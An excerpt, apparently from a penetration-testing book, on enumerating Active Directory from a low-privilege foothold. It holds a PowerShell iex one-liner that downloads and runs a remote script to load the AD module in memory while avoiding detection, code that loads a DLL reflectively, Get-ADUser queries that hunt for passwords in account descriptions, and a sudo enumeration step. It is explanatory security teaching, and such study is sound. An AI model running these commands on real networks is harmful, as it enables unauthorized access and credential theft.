- pgno: 206
  md: 'Microsoft as well, such as Active Directory Users and Computers. We can bind
    directly to the LDAP service on the Domain Controller as well, so there are lots
    of options we can take to gather more information.


    BloodHound is an excellent tool built by Specter Ops to enumerate and identify
    escalation paths within AD. A section further in this chapter will cover using
    BloodHound and finding common escalation paths.


    To use the PowerShell ActiveDirectory module, the computer will need to have the
    module installed as a part of the Remote Server Administration Tools (RSAT) package.
    Microsoft has documentation on adding this feature to a machine,⁴ but it requires
    administrative level access to add new software. Since we’re operating from a
    foothold, we don’t have the juice to install new software on the machine.


    ![](img/181571ad74cba0e6a2f38fcd2658651e_206_0.png)


    FIGURE 7.3 Adding a new feature within the Windows 10 Settings panel for the RSAT
    Active Directory tools. This requires administrative permissions to install.


    How can we get past this? Well, it turns out that the ActiveDirectory module is
    simply that, a PowerShell module at the end of the day. What we can do instead
    is transfer the Microsoft DLL to our machine and import them without a requirement
    for administrative access.


    Several GitHub repositories host the signed ActiveDirectory module which can be
    imported directly into memory without touching the disk. One such repository is
    hosted at https://github.com/samratashok/ADModule, where the author has created
    an import script to install directly into memory⁵. The benefits of this approach
    are that the module is still the same one signed and trusted by Microsoft, which
    indicates a VERY low chance of detection by malware tools. This can be launched
    and imported with the following PowerShell command:


    ```

    ```powershell

    iex (new-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1'');Import-ActiveDirectory

    ```

    ```


    What this command does is download the file as a string, then leverages it within
    the Invoke-Expression (aliased as iex) to run the commands within the string.
    Note that we can always download this PS1 file and host it on a local share for
    systems that do not have direct Internet access. Now that we have the module imported,
    we can begin to query AD directly from our user-level access.


    If downloading the module this way does not work, we always can import the assembly
    from the Microsoft DLL into memory. The code below is an effective way to load
    the C# assembly from the DLL into memory, and then import the assembly into PowerShell.
    If you need a copy of the DLL, see the AD-Module repository on GitHub at https://github.com/m4lwhere/AD-Module.'
  merge: -1
  img_proc: true
- pgno: 207
  md: '```

    ```powershell

    iwr -uri "https://github.com/m4lwhere/AD-Module/raw/main/Microsoft.ActiveDirectory.Management.dll"
    -outfile ~\AD.dll


    $ad = [System.Reflection.Assembly]::Load(([byte[]]([IO.File]::ReadAllBytes ("C:\Users\Chris\AD.dll"))));


    Import-Module -Assembly $ad

    ```

    ```


    ![](img/181571ad74cba0e6a2f38fcd2658651e_207_0.png)


    **FIGURE 7.4** Showing that the ActiveDirectory module is not installed by attempting
    to use the Get-ADUser cmdlet, installing the ActiveDirectory signed module in
    memory through PowerShell Invoke-Expression (aliased as iex), and then showing
    access to Get-ADUser.


    Now that we have imported this module, we can start enumerating users directly
    from the connected AD domain. Again, we are very interested in user descriptions
    since it is common for sysadmins to place passwords in the description box. Let’s
    try to identify all accounts on the domain that have a description — the command
    below searches based on a filter where the Description is not null.


    ```

    ```powershell

    Get-ADUser -Filter {Description -like "*"} -Properties * | Select-Object

    samAccountName, Enabled, Description

    ```

    ```


    Now this gives us a nice table and check it out! Looks like there are at least
    two accounts with a password in the description. Note that one is labeled as disabled,
    but there is a very high likelihood that the same password is assigned to other
    accounts in the domain.


    ![](img/181571ad74cba0e6a2f38fcd2658651e_207_1.png)


    **FIGURE 7.5** Using the Get-ADUser cmdlet to gather account names and descriptions.'
  merge: -1
  img_proc: true
- pgno: 208
  md: "In operational environments, it is common to find several thousands of user\
    \ accounts we need to parse and understand. We can always refine this search further\
    \ by filtering based on specific strings to search within the Description field,\
    \ such as “Password”, “Pass”, and “pwd”. The PowerShell cmdlet **Select-String**\
    \ operates in a way similar to the Linux **grep** utility and allows us to search\
    \ via regex. We can leverage the regex to try and quickly locate sensitive findings\
    \ with something similar to “p.ss” which would match on “Password”, “p@ssword”,\
    \ and “p@Ssw0rd”. Select-String is case-insensitive by default, meaning that it\
    \ will match on uppercase or lowercase letters.\n\n```\n```powershell\nGet-ADUser\
    \ -Filter {Description -like \"*\"} -Properties * | Select-Object\nsamAccountName,\
    \ Enabled, Description | Select-String -Pattern p.ss, pw,\npwd\n```\n```\n\n![](img/181571ad74cba0e6a2f38fcd2658651e_208_0.png)\n\
    \n**FIGURE 7.6** Adding the Select-String cmdlet to use regex to try and locate\
    \ account descriptions with passwords.\n\n# Who’s Got the Juice?\n\nNow that we\
    \ know who else is on this system, we need to identify who has the juice to gain\
    \ administrative or root level access. Generally, this is through various group\
    \ memberships on a Windows machine and through sudo permissions for a Linux machine.\n\
    \nLocal administrator privileges give us a big advantage as we work through an\
    \ environment—this means that we can gain sensitive information stored on the\
    \ computer and attempt to use that to pivot further within the environment. Certain\
    \ items such as additional password hashes, local browsing data, and personal\
    \ notes tend to be areas where users store additional authentication information.\
    \ Our job is to try and find these weaknesses before a threat actor can—and that\
    \ way we can remove and reduce the risk as much as possible.\n\n# Sudo Make Me\
    \ a Sandwich\n\nThe sudo permission on Linux machines allows certain users to\
    \ run commands directly as the root user or as a different user on the local machine.\
    \ This is necessary in most environments, especially for system administrators\
    \ and other necessary system tasks. Utilizing sudo can be done effectively and\
    \ securely if properly scoped and tested.\n\nSeveral plugin policies can be enabled\
    \ and utilized for the sudo program, the most common is the sudoers file. This\
    \ file is located at **/etc/sudoers** and leverages the policy stored there to\
    \ determine who and what is allowed to occur within the sudo command. The policy\
    \ can be defined to determine if a password is required to use certain commands\
    \ or not.\n\nTo list what actions the current account can take with sudo, run\
    \ the command below (this uses a LOWERCASE “L” as a switch). This lists the allowed\
    \ and forbidden commands for the user on the current host. This will further reveal\
    \ which commands are allowed and in which format.\n\n```\n```text\n$ sudo -l\n\
    Matching Defaults entries for chris on MSI:\n    env_reset, mail_badpass,\n  \
